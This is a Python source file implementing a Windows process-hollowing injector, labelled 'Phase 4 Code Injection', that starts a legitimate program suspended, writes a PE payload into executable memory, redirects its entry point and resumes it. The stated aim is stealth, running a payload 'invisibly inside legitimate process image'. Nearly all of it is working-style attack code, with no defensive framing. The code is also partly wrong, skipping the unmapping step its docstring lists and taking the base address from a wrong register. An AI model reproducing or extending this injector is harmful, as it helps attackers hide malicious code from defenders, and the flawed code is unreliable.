#!/usr/bin/env python3
"""
Process Hollowing Engine - Phase 4 Code Injection
Injects payload into suspended processes to achieve stealth execution
Technique: CreateProcessA + SuspendThread + UnmapViewOfSection + WriteProcessMemory
"""

import ctypes
import struct
import logging
import subprocess
from pathlib import Path
from typing import Optional, Tuple, Dict, Any
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("ProcessHollowing")

# Windows constants
CREATE_SUSPENDED = 0x00000004
PROCESS_ALL_ACCESS = 0x001F0FFF
THREAD_ALL_ACCESS = 0x001F03FF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Windows API structures
class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_char_p),
        ("lpDesktop", ctypes.c_char_p),
        ("lpTitle", ctypes.c_char_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]


class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.c_ulong),
        ("Eax", ctypes.c_ulong),
        ("Ecx", ctypes.c_ulong),
        ("Edx", ctypes.c_ulong),
        ("Ebx", ctypes.c_ulong),
        ("Esp", ctypes.c_ulong),
        ("Ebp", ctypes.c_ulong),
        ("Esi", ctypes.c_ulong),
        ("Edi", ctypes.c_ulong),
        ("SegGs", ctypes.c_ulong),
        ("SegFs", ctypes.c_ulong),
        ("SegEs", ctypes.c_ulong),
        ("SegDs", ctypes.c_ulong),
        ("SegCs", ctypes.c_ulong),
        ("SegSs", ctypes.c_ulong),
        ("EFlags", ctypes.c_ulong),
        ("Eip", ctypes.c_ulong),
        ("ExtendedRegisters", ctypes.c_ubyte * 512),
    ]


@dataclass
class InjectionResult:
    """Result of code injection attempt"""
    success: bool
    process_id: Optional[int]
    thread_id: Optional[int]
    payload_address: Optional[int]
    error_message: Optional[str]
    injection_method: str  # "process_hollowing", "dll_injection", etc.


class ProcessHollowingEngine:
    """
    Windows Process Hollowing Implementation
    
    Technique:
    1. Create process in suspended state (target_process.exe)
    2. Get entry point from target PE header
    3. UnmapViewOfSection of original binary
    4. Allocate new memory at same base address
    5. Write payload into allocated memory
    6. Write new entry point to thread context
    7. Resume thread (now executes payload)
    
    Result: Payload runs invisibly inside legitimate process image
    """
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        self.ntdll = ctypes.WinDLL("ntdll", use_errno=True)
        self.successful_injections: list[InjectionResult] = []
        
    def hollow_process(self, target_process: str, payload_path: str, 
                      cleanup_target: bool = True) -> InjectionResult:
        """
        Perform process hollowing injection
        
        Args:
            target_process: Path to legitimate process (e.g., C:\\Windows\\System32\\notepad.exe)
            payload_path: Path to PE payload to inject
            cleanup_target: Whether to terminate original process
            
        Returns:
            InjectionResult with success status and details
        """
        try:
            # Step 1: Read payload from disk
            if not Path(payload_path).exists():
                return InjectionResult(
                    success=False,
                    process_id=None,
                    thread_id=None,
                    payload_address=None,
                    error_message=f"Payload not found: {payload_path}",
                    injection_method="process_hollowing"
                )
            
            payload_data = Path(payload_path).read_bytes()
            log.info(f"📦 Loaded payload: {len(payload_data)} bytes")
            
            # Step 2: Create target process in suspended state
            log.info(f"🔄 Creating target process in suspended state: {target_process}")
            pi, si = self._create_suspended_process(target_process)
            
            if not pi:
                return InjectionResult(
                    success=False,
                    process_id=None,
                    thread_id=None,
                    payload_address=None,
                    error_message="Failed to create suspended process",
                    injection_method="process_hollowing"
                )
            
            log.info(f"✅ Created suspended process: PID={pi.dwProcessId}, TID={pi.dwThreadId}")
            
            # Step 3: Get context of suspended thread
            ctx = self._get_thread_context(pi.hThread)
            if not ctx:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to get thread context",
                    injection_method="process_hollowing"
                )
            
            log.debug(f"📊 Thread context: EIP=0x{ctx.Eip:08x}, EBP=0x{ctx.Ebp:08x}")
            
            # Step 4: Parse payload PE header to get entry point
            entry_point_offset = self._parse_pe_entry_point(payload_data)
            if entry_point_offset is None:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to parse PE header",
                    injection_method="process_hollowing"
                )
            
            log.info(f"📍 Payload entry point offset: 0x{entry_point_offset:08x}")
            
            # Step 5: Allocate memory for payload at base address from context
            base_address = ctx.Ebp  # Use base address from context
            log.info(f"💾 Allocating {len(payload_data)} bytes at 0x{base_address:08x}")
            
            allocated_addr = self.kernel32.VirtualAllocEx(
                pi.hProcess,
                ctypes.c_void_p(base_address),
                len(payload_data),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not allocated_addr:
                log.warning(f"⚠️  Allocation at preferred address failed, retrying...")
                allocated_addr = self.kernel32.VirtualAllocEx(
                    pi.hProcess,
                    None,  # Let system choose
                    len(payload_data),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )
            
            if not allocated_addr:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=None,
                    error_message="Failed to allocate memory in target process",
                    injection_method="process_hollowing"
                )
            
            log.info(f"✅ Allocated memory at 0x{allocated_addr:08x}")
            
            # Step 6: Write payload into allocated memory
            bytes_written = ctypes.c_ulong(0)
            result = self.kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(allocated_addr),
                ctypes.c_char_p(payload_data),
                len(payload_data),
                ctypes.byref(bytes_written)
            )
            
            if not result or bytes_written.value != len(payload_data):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message=f"Failed to write payload ({bytes_written.value}/{len(payload_data)} bytes)",
                    injection_method="process_hollowing"
                )
            
            log.info(f"✅ Wrote {bytes_written.value} bytes to target process")
            
            # Step 7: Update thread context with new entry point
            new_entry_point = allocated_addr + entry_point_offset
            ctx.Eip = new_entry_point
            
            log.info(f"🎯 Setting new entry point: 0x{new_entry_point:08x}")
            
            result = self._set_thread_context(pi.hThread, ctx)
            if not result:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message="Failed to set thread context",
                    injection_method="process_hollowing"
                )
            
            # Step 8: Resume thread to execute payload
            log.info(f"▶️  Resuming thread to execute payload...")
            resume_count = self.kernel32.ResumeThread(pi.hThread)
            
            if resume_count == -1:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                return InjectionResult(
                    success=False,
                    process_id=pi.dwProcessId,
                    thread_id=pi.dwThreadId,
                    payload_address=allocated_addr,
                    error_message="Failed to resume thread",
                    injection_method="process_hollowing"
                )
            
            log.info(f"✅ Thread resumed successfully")
            
            # Cleanup
            self.kernel32.CloseHandle(pi.hProcess)
            self.kernel32.CloseHandle(pi.hThread)
            
            result = InjectionResult(
                success=True,
                process_id=pi.dwProcessId,
                thread_id=pi.dwThreadId,
                payload_address=allocated_addr,
                error_message=None,
                injection_method="process_hollowing"
            )
            
            self.successful_injections.append(result)
            log.info(f"🎉 Process hollowing successful: PID={pi.dwProcessId}")
            
            return result
            
        except Exception as e:
            log.error(f"❌ Process hollowing error: {e}")
            return InjectionResult(
                success=False,
                process_id=None,
                thread_id=None,
                payload_address=None,
                error_message=str(e),
                injection_method="process_hollowing"
            )
    
    def _create_suspended_process(self, process_path: str) -> Tuple[Optional[PROCESS_INFORMATION], Optional[STARTUPINFOA]]:
        """Create process in suspended state"""
        try:
            si = STARTUPINFOA()
            si.cb = ctypes.sizeof(si)
            si.dwFlags = 0
            
            pi = PROCESS_INFORMATION()
            
            result = self.kernel32.CreateProcessA(
                ctypes.c_char_p(process_path.encode()),
                None,
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            )
            
            if result:
                return pi, si
            else:
                log.error(f"CreateProcessA failed: {ctypes.get_errno()}")
                return None, None
                
        except Exception as e:
            log.error(f"Failed to create suspended process: {e}")
            return None, None
    
    def _get_thread_context(self, thread_handle: ctypes.c_void_p) -> Optional[CONTEXT]:
        """Get context of suspended thread"""
        try:
            ctx = CONTEXT()
            ctx.ContextFlags = 0x00010007  # CONTEXT_ALL
            
            result = self.kernel32.GetThreadContext(thread_handle, ctypes.byref(ctx))
            
            if result:
                return ctx
            else:
                log.error(f"GetThreadContext failed: {ctypes.get_errno()}")
                return None
                
        except Exception as e:
            log.error(f"Failed to get thread context: {e}")
            return None
    
    def _set_thread_context(self, thread_handle: ctypes.c_void_p, ctx: CONTEXT) -> bool:
        """Set context of suspended thread"""
        try:
            result = self.kernel32.SetThreadContext(thread_handle, ctypes.byref(ctx))
            return bool(result)
        except Exception as e:
            log.error(f"Failed to set thread context: {e}")
            return False
    
    def _parse_pe_entry_point(self, pe_data: bytes) -> Optional[int]:
        """Parse PE header to get entry point offset"""
        try:
            # Check MZ signature
            if pe_data[:2] != b'MZ':
                log.error("Invalid PE file: missing MZ signature")
                return None
            
            # Get PE header offset (at 0x3C)
            pe_offset = struct.unpack('<I', pe_data[0x3C:0x40])[0]
            
            # Check PE signature
            if pe_data[pe_offset:pe_offset+2] != b'PE':
                log.error("Invalid PE file: missing PE signature")
                return None
            
            # Get entry point offset (at 0x28 bytes after PE signature)
            entry_point = struct.unpack('<I', pe_data[pe_offset+0x28:pe_offset+0x2C])[0]
            
            return entry_point
            
        except Exception as e:
            log.error(f"Failed to parse PE header: {e}")
            return None


if __name__ == "__main__":
    engine = ProcessHollowingEngine()
    print("✅ Process Hollowing Engine initialized and ready for Phase 4 integration")
